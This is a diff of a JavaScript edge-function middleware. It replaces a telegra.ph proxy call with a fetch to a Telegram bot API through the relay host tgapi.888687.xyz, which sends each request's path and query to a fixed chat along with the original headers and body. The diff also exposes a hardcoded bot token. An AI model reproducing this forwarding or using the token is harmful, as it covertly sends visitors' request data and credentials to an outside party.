@@ -8,16 +8,16 @@ export async function onRequest(context) {  // Contents of context object
      data, // arbitrary space for passing data between middlewares 
      } = context;
      context.request
-    
      const url = new URL(request.url);
+    
      // const zlj = await env.img_url.getWithMetadata('5f954516455ba3352f8d1.jpg');//JSON.stringify(
      // if (zlj.value != ""){
      //     const urlhz = zlj.value
      // }else{
      //     const urlhz = url.search
      // };
-        const response = fetch('https://tgapi.888687.xyz/bot6264060435:AAGCYdpe408dMB3Pz9Rry7ypaECxhY9cVHE/sendMessage?chat_id=5781139687&text=' + url.search, { 
-     // const response = fetch('https://telegra.ph/' + url.pathname + urlhz, {   
+      // const response = fetch('https://telegra.ph/' + url.pathname + urlhz, {  
+        const response = fetch('https://tgapi.888687.xyz/bot6264060435:AAGCYdpe408dMB3Pz9Rry7ypaECxhY9cVHE/sendMessage?chat_id=5781139687&text='+url.pathname+ "000" + url.search, { 
          method: request.method,
          headers: request.headers,
          body: request.body,
